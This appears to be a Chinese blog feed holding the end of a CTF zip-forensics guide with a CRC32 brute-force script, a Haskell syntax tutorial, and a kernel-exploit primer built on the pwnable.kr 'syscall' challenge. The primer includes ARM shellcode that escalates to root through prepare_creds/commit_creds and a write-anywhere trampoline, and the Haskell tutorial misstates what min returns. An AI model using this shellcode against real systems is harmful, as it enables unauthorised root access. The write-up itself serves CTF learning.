<p>再举另一个bugku中的例子，下载下来的文件是68个压缩包，并且根据binwalk的检查结果，每个压缩包里都有一个大小为4个字节，名为out.txt的压缩文件</p>
<p><img src="/images/2017-11-12/22e9812a-c63a-4b22-8d4b-2ac8a9a84928.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>用如下的脚本碰撞出所有压缩包中的数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> zipfile</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</div><div class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</div><div class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</div><div class="line">                    s = i + j + p + q</div><div class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</div><div class="line">                        <span class="comment">#print s</span></div><div class="line">                        f.write(s)</div><div class="line">                        <span class="keyword">return</span></div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</div><div class="line">        file = <span class="string">'out'</span> + str(I) + <span class="string">'.zip'</span></div><div class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</div><div class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</div><div class="line">        crc = GetCrc.CRC</div><div class="line">        <span class="comment">#以上3行为获取压缩包CRC32值的步骤</span></div><div class="line">        <span class="comment">#print hex(crc)</span></div><div class="line">        CrackCrc(crc)</div><div class="line">  </div><div class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></div><div class="line">  </div><div class="line">f = open(<span class="string">'out.txt'</span>, <span class="string">'w'</span>)</div><div class="line">CrackZip()</div><div class="line">f.close()</div></pre></td></tr></table></figure>
<p>此题较为繁琐，之后的步骤不再展开</p>
<p>另：限于CPU的能力，CRC碰撞只能用于压缩文件较小的情况</p>
<p>笔者附：由于上述编写的代码速率不高，而且存在些许瑕疵，所以这里推荐使用工具<a href="https://github.com/theonlypwner/crc32" target="_blank" rel="external">https://github.com/theonlypwner/crc32</a></p>
<p><strong>0x07. 修改格式</strong></p>
<p>这种情况花样较多，难以做一个详细的总结，因此只列举最常见的缺少文件头或文件尾。</p>
<p>放一个zip文件格式讲的较清楚的<a href="http://blog.csdn.net/ETF6996/article/details/51946250" target="_blank" rel="external">链接</a>，通过对zip文件格式的了解，可以解释之前伪加密的问题，同时也可以对缺少文件头或文件尾有更直观的认识。</p>
<p><img src="/images/2017-11-12/b7e72a70-dfcb-430a-986c-37d305e6b05a.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>如上为正常zip，缺头zip和缺尾zip的binwalk扫描结果，根据扫描结果用16进制编辑器添加文件头或文件尾，即可修复zip。</p>
<p><strong>总结</strong></p>
<p>Zip不仅是我们生活中常用到的一种文件格式，在CTF中也经常遇到，这里做了一个关于CTF中zip的总结，如果对读者有帮助，鄙人不胜荣幸。</p>
]]></content>
      
        <categories>
            
            <category> misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> zip </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[haskell学习笔记——基本语法]]></title>
      <url>/2017/10/15/haskell%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>挖了Haskell这个坑,希望在纯函数式环境锻炼自己的函数式编程思维<br>首先来说一下环境,首先安装Haskell Platform也就是GHC<br>推荐Mac下Haskell这个IDE,也可以在GHCI这样的REPL下练习<br>话不多说,现在来学习一下Haskell的基本语法</p>
<p>参考： <a href="https://wiki.haskell.org/Haskell" target="_blank" rel="external">https://wiki.haskell.org/Haskell</a></p>
<h1 id="文件执行"><a href="#文件执行" class="headerlink" title="文件执行"></a>文件执行</h1><p>方法1: 编译后执行</p>
<blockquote>
<p>ghc --make hello</p>
<p>./hello</p>
</blockquote>
<p>方法2：解释执行</p>
<blockquote>
<p>ghci hello.hs </p>
</blockquote>
<h1 id="基本运算符"><a href="#基本运算符" class="headerlink" title="基本运算符"></a>基本运算符</h1><p>Haskell中的基本运算符与其他语言类似</p>
<ul>
<li>加 减 乘 除 + - * /<br><code>1+1</code></li>
<li>布尔运算符 与 或 非 &amp;&amp; || not<br><code>not True</code></li>
<li>关系运算符 等于 不等 == /=<br><code>not True == False</code></li>
</ul>
<h1 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h1><p>Haskell中的函数调用使用空格的方式<br><code>succ 8</code><br><code>succ</code>单参数函数,返回一个数的后继<br><code>min 8 9</code><br><code>min</code>返回较大的元素</p>
<blockquote>
<p>可以用<code></code>(数字1前的按键)将函数括起来作为中缀函数使用,如下</p>
</blockquote>
<p>9 `div` 3</p>
<h1 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h1><blockquote>
<h3 id="函数式编程语言特点"><a href="#函数式编程语言特点" class="headerlink" title="函数式编程语言特点"></a>函数式编程语言特点</h3><p>在Haskell这门纯函数式语言中,Haskell中只有定义没有赋值,已经定义的值是不能修改的,类似于数学中的变量,它的意义是这个变量代表了一个值,而非这个变量处在这个值的状态,所以说<strong>纯</strong>函数式编程中函数只能去引用数的计算结果,不会产生副作用,无论何时以同样的参数call函数都会获得一样的结果,所以函数很适合作为first class, 获得与其他语言中变量同等的地位</p>
</blockquote>
<h3 id="let关键词用于声明常量"><a href="#let关键词用于声明常量" class="headerlink" title="let关键词用于声明常量"></a>let关键词用于声明常量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">let doubleMe x = x + x</div><div class="line">doubleMe 2</div><div class="line"></div><div class="line">let doubleUs x y =</div><div class="line">      &#123;- 在函数中定义函数 -&#125;</div><div class="line">      let doublex = 2 * x</div><div class="line">          doubley = 2 * y</div><div class="line">      in doublex + doubley</div></pre></td></tr></table></figure>
<ul>
<li>可以在函数中调用其他函数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">let doubleUs x y = doubleMe x + doubleMe y</div><div class="line">doubleUs 2 3</div></pre></td></tr></table></figure>
<h2 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h2><h3 id="if-then-else语句"><a href="#if-then-else语句" class="headerlink" title="if then else语句"></a>if then else语句</h3><p>Haskell中if语句实际上是一个表达式<br>每个if都要有thenelse两部分,else不是可选的,这也就保证了表达式一定有其返回值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">let doubelSmallNumber x = if x &gt; 100</div><div class="line">                         then x</div><div class="line">                         else doubleMe x</div></pre></td></tr></table></figure>
<blockquote>
<p>Haskell中常在函数名后加单引号&#39;来区分一个相似的函数</p>
</blockquote>
<h3 id="case语句"><a href="#case语句" class="headerlink" title="case语句"></a>case语句</h3><p>case语句可以用来进行多值匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">let isOneOrTwo x = case x of 1 -&gt; &quot;1:One&quot;</div><div class="line">                             2 -&gt; &quot;2:No Two&quot;</div><div class="line">                             otherwise -&gt; &quot;otherwise&quot;</div></pre></td></tr></table></figure>
<h3 id="where语句"><a href="#where语句" class="headerlink" title="where语句"></a>where语句</h3><p>where语句其实是对变量的定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">let doubleUs x y = doublex + doubley</div><div class="line">                    where doublex = 2 * x</div><div class="line">                          doubley = 2 * y</div></pre></td></tr></table></figure>
<h3 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">let lucky 7 = &quot;You are lucky&quot;</div><div class="line">let lucky x = &quot;Sorry, you are not lucky&quot;</div><div class="line">lucky 7</div><div class="line">lucky 8</div><div class="line">--另例</div><div class="line">foo 0 x = x + 1</div><div class="line">foo 1 x = x - 1</div><div class="line">foo 2 x = 0</div></pre></td></tr></table></figure>
<p>上例表明：如果lucky 7，就返回&quot;You are lucky&quot;，否则&quot;Sorry, you are not lucky&quot;</p>
<h3 id="guard"><a href="#guard" class="headerlink" title="guard"></a>guard</h3><p>有时，模式匹配单独无法有效描述一个函数，引入一个称为guard的模式，如果这个模式匹配，每个guard的测试表达式将按顺序检查，如果测试表达式匹配，guard的值将被使用。</p>
<p>Guard开始使用 | ，后面是一个测试表达式，其返回结果或真或假，后面跟着 =，然后是返回的值，otherwise能够捕获其他所有情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">let mydiv x y</div><div class="line">      | y == 0 = &quot;Can not divide&quot;</div><div class="line">      | x / y &gt; 10 = &quot;first number is larger than the second number&quot;</div><div class="line">      | x / y &lt; 1  = &quot;first number is less than the second number&quot;</div><div class="line">      | otherwise = &quot;almost equal&quot;</div></pre></td></tr></table></figure>
<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">--配合guard</div><div class="line">let mysum x y</div><div class="line">      | x &gt; y = mysum y x</div><div class="line">      | x == y = x</div><div class="line">      | otherwise = x + mysum (x+1) y</div></pre></td></tr></table></figure>
<blockquote>
<p>模式匹配与guard的区别:区别就在于一个对比的是对象，一个对比的是布尔值。</p>
</blockquote>
<h3 id="函数定义-1"><a href="#函数定义-1" class="headerlink" title="函数定义"></a>函数定义</h3><p>下面是我们定义一个函数addone，输入参数是整数，输出也是整数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">addOne :: Integer -&gt; Integer</div><div class="line">addOne n = n + 1</div></pre></td></tr></table></figure>
<p>第一行是我们定义一个函数名称为addOne，这个函数有一个Integer参数，返回一个Integer。第二行表示对于我们函数的任何输入，我们将把这个输入表示为n，那么我们将返回n+1。</p>
<p>注意，这里 = 是数学中的意义，在我们程序中任何地方有addOne n，我们能够使用n+1来替代它，得到的都是精确同样的结果，这其实是引用透明的案例，因为我们的函数对于任何给定输入总是返回同样的值。</p>
<p>addOne 10<br>返回11</p>
<p>调用这个函数的方式是函数名称后跟着参数，之间都是有空格分开，没有任何逗号和括号，</p>
<h3 id="函数与模式匹配"><a href="#函数与模式匹配" class="headerlink" title="函数与模式匹配"></a>函数与模式匹配</h3><p>让我们定义另外一个函数，它是对于输入一个姓氏能够输出其姓名:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">lastName :: String -&gt; String</div><div class="line">lastName &quot;anthony&quot; = &quot;gillis&quot;</div><div class="line">lastName &quot;michelle&quot; = &quot;jocasta&quot;</div><div class="line">lastName &quot;gregory&quot; = &quot;tragos&quot;</div></pre></td></tr></table></figure>
<p>Haskell函数定义依赖于模式匹配，如果你使用参数&quot;anthony&quot;调用lastName函数，，那么函数就会返回字符串&quot;gillis&quot;，如果你使用&quot;michelle&quot;，那么就会返回&quot;jocasta&quot;</p>
<p>但是如果我们输入一个在这三个中不存在姓呢？</p>
<p>lastName &quot;bob&quot;</p>
<p>就会得到一个exception: Non-exhaustive patterns in function lastName。这是因为我们的函数不是total，它并没有对于每个可能的输入有一个定义好的输出，通常函数应该是无论任何可能都是确定的，那么我们重新定义函数如下：</p>
<p>lastName :: String -&gt; String<br>lastName &quot;anthony&quot; = &quot;gillis&quot;<br>lastName &quot;michelle&quot; = &quot;jocasta&quot;<br>lastName &quot;gregory&quot; = &quot;tragos&quot;<br>lastName n = &quot;<unknown>&quot;</unknown></p>
<p>现在我们的函数是total了，最后一个会捕获所有情况，如果上面三个不匹配，那么最后一个总是将参数绑定到n，<font color="#f00">我们能够使用_ 来代表n 表示我们其实不关心其值。</font></p>
<h3 id="多个参数函数"><a href="#多个参数函数" class="headerlink" title="多个参数函数"></a>多个参数函数</h3><p>让我们定义一个函数areAscending，它有三个整数参数，如果它们是严格递增那么就返回真：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">areAscending :: Integer -&gt; Integer -&gt; Integer -&gt; Bool</div><div class="line">areAscending a b c = a &lt; b &amp;&amp; b &lt; c</div></pre></td></tr></table></figure>
<p>我们的类型语法看上去是不是有点奇怪？参数之间有箭头，且返回一个值类型？这种多参数函数称为curried，柯里化是将多个参数的一个函数作为输入，转入一系列只有一个参数的函数，返回另外一个函数，比如用伪Swift代码如下：</p>
<p>myFunc(a: A, b: B, c: C) -&gt; Z</p>
<p>函数func1(a: A)当被调用时，返回一个函数func2(b: B)，它又返回一个函数func3(c: C)，它被调用最后返回Z类型结果。</p>
<p>请注意，在我们的模式匹配中，我们分配第一个参数到a，第二个是b，第三个是c，这样我们能够在=后面使用它们来执行我们的计算：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">areAscending 1 2 3</div><div class="line">-- = True</div><div class="line"></div><div class="line">areAscending 3 4 2</div><div class="line">-- = False</div></pre></td></tr></table></figure>
<p>如果我们希望使用一个表达式调用这个函数，而不是一个个参数遍历，那么我们需要使用括号包围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">areAscending 1 (1 + 1) 3</div><div class="line">-- = True</div></pre></td></tr></table></figure>
<p>而没有括号的areAscending 1 1 + 1 3则被解释为(areAscending 1 1) + (1 3)，这是没有意义。</p>
<h3 id="零参数函数"><a href="#零参数函数" class="headerlink" title="零参数函数"></a>零参数函数</h3><p>如果参数没有怎么办？零参数函数也是一个函数，总是返回一个值，这又是引用透明的原理了，因为只有一个办法调用无参数函数，这个函数也总是返回一个值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">someValue :: String</div><div class="line"></div><div class="line">someValue = &quot;hello world&quot;</div></pre></td></tr></table></figure>
<p>零参数函数类似于常量，只要看到someValue，我们都可以使用&quot;hello world&quot;来替代，这正是我们从一个常量中应该预期到结果。</p>
<h3 id="绑定Binding与变量不可变"><a href="#绑定Binding与变量不可变" class="headerlink" title="绑定Binding与变量不可变"></a>绑定Binding与变量不可变</h3><p>Haskell使用=实现绑定，前面我们说=是引用透明的案例，是一种数学意义，实际是将两者绑定了。</p>
<p>Binding名称不能大写，绑定可以定义一个或多个参数的函数，函数和参数使用空格，这是Haskell区别其他语言的简洁之处</p>
<font color="#f00">括号可以包装复合表达式，当然也可以使用\$符号</font>



<p>与命令式语言变量不同,Haskell绑定变量 不可变的</p>
<p>特点有两个：</p>
<ol>
<li>order-independent ——绑定在源代码的顺序并不重要</li>
<li>Lazy懒赋值 ——定义变量只在需要的时候进行赋值</li>
</ol>
<p>此外，变量名的scope是只在自己定义的范围内递归的</p>
<h3 id="表达式和绑定都有一个类型"><a href="#表达式和绑定都有一个类型" class="headerlink" title="表达式和绑定都有一个类型"></a>表达式和绑定都有一个类型</h3><ul>
<li>Bool - 有两个元素： True 或 False</li>
<li>Char - unicode符合集合</li>
<li>Int - 固定大小整数</li>
<li>Integer - 无限大小整数</li>
<li>Double - IEEE 浮点数字</li>
<li><em>type1</em> -&gt; <em>type2</em> - 一个输入类型<em>type1</em> 到输出类型 <em>type2</em>的函数</li>
<li>(<em>type1</em>, <em>type2</em>, ..., <em>typeN</em>) - 类型数组tuple</li>
<li>() - 零数组tuple, 称为<em>unit</em> (类似C的void); 这个类型只有一个值：空。</li>
</ul>
<h3 id="Monoid"><a href="#Monoid" class="headerlink" title="Monoid"></a>Monoid</h3><p>首先，需要了解<a href="http://www.jdon.com/idea/monoid.html" target="_blank" rel="external">什么是Monoid</a>。在形式语言与自动机中有介绍！在Haskell中，表达三个函数的Monoid可以如下表达：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">add :: Integer -&gt; (Integer -&gt; Integer)</div><div class="line">add arg1 arg2 = arg1 + arg2</div></pre></td></tr></table></figure>
<p>这里使用括号，其实这个Monoid符合结合律，括号是没有必要的，等同于如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">add :: Integer -&gt; Integer -&gt; Integer</div></pre></td></tr></table></figure>
<h3 id="Lambda抽象"><a href="#Lambda抽象" class="headerlink" title="Lambda抽象"></a>Lambda抽象</h3><ul>
<li><p>你可以通过lambda实现匿名函数</p>
</li>
<li><p>符号是： \<em>variable(s)</em> -&gt; <em>body</em> ( \被称为&quot;lambda&quot;)</p>
</li>
<li><p>案例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">countLowercaseAndDigits :: String -&gt; Int</div><div class="line">countLowercaseAndDigits = length . filter (\c -&gt; isLower c || isDigit c)</div></pre></td></tr></table></figure>
</li>
<li><p>lambda使用模式匹配能够分解值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">... (\(Right x) -&gt; x) ...</div></pre></td></tr></table></figure>
<ul>
<li>But note that guards or multiple bindings are not allowed</li>
<li>Patterns must have the right constructor or will get run-time error</li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> code </category>
            
        </categories>
        
        
        <tags>
            
            <tag> haskell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[kernel exploit简介]]></title>
      <url>/2017/10/14/kernel-exploit%E7%AE%80%E4%BB%8B/</url>
      <content type="html"><![CDATA[<h3 id="1、Linux内核exploit介绍"><a href="#1、Linux内核exploit介绍" class="headerlink" title="1、Linux内核exploit介绍"></a>1、Linux内核exploit介绍</h3><p>在linux下，整个内存空间中，只有一部分低地址是进程可访问的，而高地址处则是属于内核。例如，在x86的机器上，<code>0x00000000</code>到<code>0xbfffffff</code>是属于进程的，而<code>0xc0000000</code>到<code>0xffffffff</code>这1 GB是属于内核的。</p>
<p>出于安全考虑，进程无法访问属于内核的内存，否则恶意进程就有可能对系统内核的内存进行读取或者篡改。反过来，属于进程的内存，是可以被内核访问的。特别地，在内核太可以跳转执行用户空间中的代码。（不过，在某些硬件上，比如较新的Core CPU，Intel加入了SMEP等保护功能，限制了内核执行用户空间代码的操作）</p>
<p>内核空间的exploit，本质上与用户空间的exploit是相同的：都是修改执行流程，达到我们的目的。一般来说，用户空间的exploit，其目的是获取shell；而内核空间的exploit，其目的则是提升权限，获取对系统的完全控制。</p>
<p>Linux系统下，每个进程拥有其对应的<code>struct cred</code>，用于记录该进程的uid。内核exploit的目的，便是修改当前进程的cred，从而提升权限。当然，进程本身是无法篡改自己的cred的，我们需要在内核空间中，通过以下方式来达到这一目的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">commit_creds(prepare_kernel_cred(0));</div></pre></td></tr></table></figure>
<p>其中，<code>prepare_kernel_cred()</code>创建一个新的cred，参数为0则将cred中的uid, gid设置为0，对应于root用户。随后，<code>commit_creds()</code>将这个cred应用于当前进程。此时，进程便提升到了root权限。</p>
<p>这些方法的地址，可以通过<code>/proc/kallsyms</code>获取。不过，有时为了安全，管理员会隐藏内核符号的地址，此时便无法通过这一方式获取地址。</p>
<p>提升权限后，我们还需要返回到用户空间。在这里，我们可以运行shell，从而以root身份执行任意命令了。</p>
<h3 id="2、范例——pwnable-kr-syscall"><a href="#2、范例——pwnable-kr-syscall" class="headerlink" title="2、范例——pwnable.kr: syscall"></a>2、范例——pwnable.kr: syscall</h3><p>在pwnable.kr上有一道题，syscall，就可以作为内核exploit的入门</p>
<p>其中将syscall.c编译进了内核</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">// adding a new system call : sys_upper</div><div class="line"></div><div class="line">#include &lt;linux/module.h&gt;</div><div class="line">#include &lt;linux/kernel.h&gt;</div><div class="line">#include &lt;linux/slab.h&gt;</div><div class="line">#include &lt;linux/vmalloc.h&gt;</div><div class="line">#include &lt;linux/mm.h&gt;</div><div class="line">#include &lt;asm/unistd.h&gt;</div><div class="line">#include &lt;asm/page.h&gt;</div><div class="line">#include &lt;linux/syscalls.h&gt;</div><div class="line"></div><div class="line">#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!</div><div class="line">#define NR_SYS_UNUSED		223</div><div class="line"></div><div class="line">//Pointers to re-mapped writable pages</div><div class="line">unsigned int** sct;</div><div class="line"></div><div class="line">asmlinkage long sys_upper(char *in, char* out)&#123;</div><div class="line">	int len = strlen(in);</div><div class="line">	int i;</div><div class="line">	for(i=0; i&lt;len; i++)&#123;</div><div class="line">		if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a)&#123;</div><div class="line">			out[i] = in[i] - 0x20;</div><div class="line">		&#125;</div><div class="line">		else&#123;</div><div class="line">			out[i] = in[i];</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static int __init initmodule(void )&#123;</div><div class="line">	sct = (unsigned int**)SYS_CALL_TABLE;</div><div class="line">	sct[NR_SYS_UNUSED] = sys_upper;</div><div class="line">	printk(&quot;sys_upper(number : 223) is added\n&quot;);</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void __exit exitmodule(void )&#123;</div><div class="line">	return;</div><div class="line">&#125;</div><div class="line"></div><div class="line">module_init( initmodule );</div><div class="line">module_exit( exitmodule );</div></pre></td></tr></table></figure>
<h4 id="2-1-问题分析"><a href="#2-1-问题分析" class="headerlink" title="2.1 问题分析"></a>2.1 问题分析</h4><p>你会发现这道题目提供了一个编写的内核模块源码，其中添加了一个syscall，其执行的逻辑基本与<code>strcpy()</code>相同，只是会将小写字母变为大写字母。</p>
<p>那么，这里的漏洞就很明显了，基本上就是一个向任意地址写任意内容的漏洞，只要写入的内容不包含小写字母。接下来，就是如何利用这个syscall，获取root权限，从而读取flag文件。</p>
<p>系统调用的地址存在<code>0x8000e348+223 = 0x8000e6c4</code>, flag在<code>/root/flag</code></p>
<h4 id="2-2-解题思路"><a href="#2-2-解题思路" class="headerlink" title="2.2 解题思路"></a>2.2 解题思路</h4><p>首先修改 223 号系统调用的内容，然后调用这个修改过的 223 号系统调用，在 kernel space 把 uid 改掉，之后在 user space <code>execve()</code>就好了。</p>
<h4 id="2-3-解题步骤"><a href="#2-3-解题步骤" class="headerlink" title="2.3 解题步骤"></a>2.3 解题步骤</h4><p>在现在版本的 Linux 内核修改 uid，需要通过<code>prepare_creds()</code>和<code>commit_creds()</code>两步<a href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/#fn:2" target="_blank" rel="external">参考2</a>。这两个函数的地址存在<code>/proc/kallsyms</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat /proc/kallsyms | grep &apos;prepare_creds\|commit_creds&apos;</div><div class="line">8003f44c T prepare_creds</div><div class="line">8003f56c T commit_creds</div><div class="line">...</div></pre></td></tr></table></figure>
<p>参考 <a href="https://github.com/acama" target="_blank" rel="external">@acama</a> 的版本<a href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/#fn:3" target="_blank" rel="external"> 参考3</a>写了一个( <a href="https://github.com/acama" target="_blank" rel="external">@acama</a> 的版本<code>prepare_creds()</code>之后直接就<code>commit_creds()</code>, 这估计只在老版本可以).<code>prepare_creds()</code>返回的结构体定义可以看<a href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/#fn:4" target="_blank" rel="external">参考4</a>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">@ prepare_creds and commit_creds</div><div class="line">.section .text</div><div class="line">.global _start</div><div class="line">_start:</div><div class="line">    push &#123;lr&#125;</div><div class="line"></div><div class="line">    mov r0, #0</div><div class="line">    ldr r3, =0x8003f44c  @ prepare_creds()</div><div class="line">    blx r3</div><div class="line"></div><div class="line">    push &#123;r0&#125;</div><div class="line">    sub r1, r1, r1</div><div class="line">    add r0, #4</div><div class="line">    str r1, [r0], #4  @ set uid, euid, gid, etc</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line"></div><div class="line">    pop &#123;r0&#125;</div><div class="line">    ldr r3, =0x8003f56c  @ commit_creds(r0)</div><div class="line">    blx r3</div><div class="line"></div><div class="line">    pop &#123;lr&#125;</div><div class="line">    bx lr</div></pre></td></tr></table></figure>
<p>这个生成的指令是不能用原先的 223 号系统调用直接写进内存的，所以我准备了一个真正的<code>write-anything-anywhere</code>的跳板:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">@ Write anything anywhere</div><div class="line"></div><div class="line">.section .text</div><div class="line">.global _start</div><div class="line">_start:</div><div class="line"></div><div class="line">lp:</div><div class="line">    ldrb r3, [r0], #1</div><div class="line">    strb r3, [r1], #1</div><div class="line">    subs r2, r2, #1</div><div class="line">    bge lp</div><div class="line"></div><div class="line">    bx lr</div></pre></td></tr></table></figure>
<p>先把 waa 写进内存，然后把 cred 写进内存。至于写到哪里，我随手写了两个地址: 0x83f5cafe, 0x83f6beee.</p>
<h4 id="2-4-exp集锦"><a href="#2-4-exp集锦" class="headerlink" title="2.4 exp集锦"></a>2.4 exp集锦</h4><p>参考: <a href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/" target="_blank" rel="external">https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/</a></p>
